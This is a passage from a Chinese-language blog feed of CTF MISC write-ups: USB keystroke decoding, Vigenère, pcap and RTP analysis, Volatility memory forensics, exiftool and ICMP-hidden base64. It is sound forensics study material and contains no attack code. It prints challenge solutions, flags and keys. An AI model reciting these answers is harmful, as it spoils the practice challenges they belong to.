line[22]!&#x3D;&#39;0&#39;:</span><br><span class="line">        continue</span><br><span class="line">    nums.append(int(line[6:8],16))</span><br><span class="line">keys.close()</span><br><span class="line">output &#x3D; &quot;&quot;</span><br><span class="line">for n in nums:</span><br><span class="line">    if n &#x3D;&#x3D; 0 :</span><br><span class="line">        continue</span><br><span class="line">    if n in mappings:</span><br><span class="line">        output +&#x3D; mappings[n]</span><br><span class="line">    else:</span><br><span class="line">        output +&#x3D; &#39;[unknown]&#39;</span><br><span class="line">print &#39;output :\n&#39; + output</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">output :</span><br><span class="line">KEYXINAN</span><br></pre></td></tr></table></figure><p>至此，我们已经得到了一个密文ci{v3erf_0tygidv2_fc0}和密钥XINAN</p><p>需要密钥的文本加密，考虑维吉尼亚编码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fa&#123;i3eei_0llgvgn2_sc0&#125;</span><br></pre></td></tr></table></figure><p>由于没有看到flag头，一把梭得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;vig3ne2e_is_c00l&#125;</span><br></pre></td></tr></table></figure><h3><span id="15"><em>15</em></span></h3><h4><span id="suctf2018followme"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。来源：<a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2018">https://github.com/hebtuerror404/CTF_competition_warehouse_2018</a></p></blockquote><p>得到一个数据包，发现存在一堆HTTP流，文件名基本都为【login?_=】</p><p>猜测flag为登录密码，因为登录成功和失败有一定区别，故按大小排序，有明显不同的那个看看</p><p>得到flag</p><p><img src="sNvl24.jpg" alt="sNvl24"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SUCTF&#123;password_is_not_weak&#125;</span><br></pre></td></tr></table></figure><h3><span id="16"><em>16</em></span></h3><h4><span id="voip"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到一个流量包，全是RTP流量</p><p>学到了【电话-&gt;RTP-&gt;RTP流】或者根据题目名称【电话-&gt;VoIP通话】</p><p>接下来就是英语听力部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;9001IVR&#125;</span><br></pre></td></tr></table></figure><h3><span id="17"><em>17</em></span></h3><h4><span id="hdctf2019你能发现什么蛛丝马迹吗"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>漂亮的内存取证</p><p>利用volatility</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f memory.img imageinfo</span><br></pre></td></tr></table></figure><p>查看可能版本</p><p><img src="s4IdJg.jpg" alt="s4IdJg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f memory.img --profile&#x3D;Win2003SP1x86 pslist</span><br></pre></td></tr></table></figure><p>查看进程</p><p><img src="s4TKvd.jpg" alt="s4TKvd"></p><p>发现DumpIt.exe</p><p>查看cmd命令使用记录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f memory.img --profile&#x3D;Win2003SP1x86 cmdscan</span><br></pre></td></tr></table></figure><p><img src="s4Tn8e.jpg" alt="s4Tn8e"></p><p>发现flag的痕迹</p><p>dump下来</p><p><img src="s4TmCD.jpg" alt="s4TmCD"></p><p>foremost分离</p><p>得到output文件夹</p><p>有东西!</p><p>得到一张二维码</p><p>扫描后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">viL1234567890123456</span><br></pre></td></tr></table></figure><p>AES带密码带偏移量解密http://tool.chacuo.net/cryptaes</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure><h3><span id="18"><em>18</em></span></h3><h4><span id="百里挑一"></span></h4><blockquote><p>好多漂亮的壁纸，赶快挑一张吧！ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到很多TCP数据包，导出HTTP数据能发现题目提到的大量壁纸。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings *|grep flag</span><br></pre></td></tr></table></figure><p>未果</p><p>花了点时间安装大佬们提到的exiftool</p><p>安装ExifToolWindows：<a href="https://exiftool.org/">下载ExifTool可执行文件</a>（名为：exiftool-x.x.zip），解压得到exiftool(-k).exe，重命名为exiftool.exe，通过CMD命令行运行。Linux：<a href="https://exiftool.org/">下载ExifTool发行包</a>（名为：Image-ExifTool-x.x.tar.gz），解压后运行./exiftool即可。或通过perl <a href="http://Makefile.PL">Makefile.PL</a> &amp;&amp; make install编译安装。MacOS：<a href="https://exiftool.org/">下载ExifTool安装包</a>（名为ExifTool-x.x.dmg），安装后在终端执行exiftool使用。详细的安装文档，参考ExifTool主页安装文档</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cb4bbe1c-bffe-4101-a9de-4de40bca4558 (1)# </span><br><span class="line">exiftool *|grep flag</span><br><span class="line">XP Comment                      : 恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</span><br></pre></td></tr></table></figure><p>得到了一半的flag</p><p>后半部分目前不明白是咋推出来的</p><p><img src="so2tln.png" alt="so2tln"></p><p>2.6.a.3.c.0.5.8.9.d.2.3.e.d.e.e.c.}</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</span><br></pre></td></tr></table></figure><h3><span id="19"><em>19</em></span></h3><h4><span id="bsidessf2019zippy"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到一个TCP流量的数据包，追踪几个流量，分别得到了</p><p><img src="sT5gMQ.jpg" alt="sT5gMQ"></p><p><img src="sT56xg.jpg" alt="sT56xg"></p><p>第一张图开头为PK，以原始数据保存后更改后缀名为.zip</p><p>第二章图能得到加密压缩包的密码</p><p>打开压缩包得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CTF&#123;this_flag_is_your_flag&#125;</span><br></pre></td></tr></table></figure><h3><span id="20"><em>20</em></span></h3><h4><span id="bsidessf2019table-tennis"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交</p></blockquote><p>注意到ICMP流中出现了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span><br></pre></td></tr></table></figure><p>等字样，挨个誊写</p><p><img src="6p32X8.png" alt="6p32X8"></p><p><img src="6p3g6f.png" alt="6p3g6f"></p><p><img src="6p3c1P.png" alt="6p3c1P"></p><p><img src="6p3sfI.png" alt="6p3sfI"></p><p><img src="6p36pt.png" alt="6p36pt"></p><p><img src="6p3f0g.png" alt="6p3f0g"></p><p><img src="6p3h7Q.png" alt="6p3h7Q"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">writeat(ob(&quot;Q1RGe0p1c3RBUzBuZ0FiMHV0UDFuZ1Awbmd9&quot;));</span><br></pre></td></tr></table></figure><p>base64解码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CTF&#123;JustAS0ngAb0utP1ngP0ng&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;data1&quot;&gt;Data[1]&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;写在前面&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;浅薄笔者目前还无法完全消化理解wireshark相关流量分析的工具的内涵，先就针对遇到的题目类型做</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
</feed>
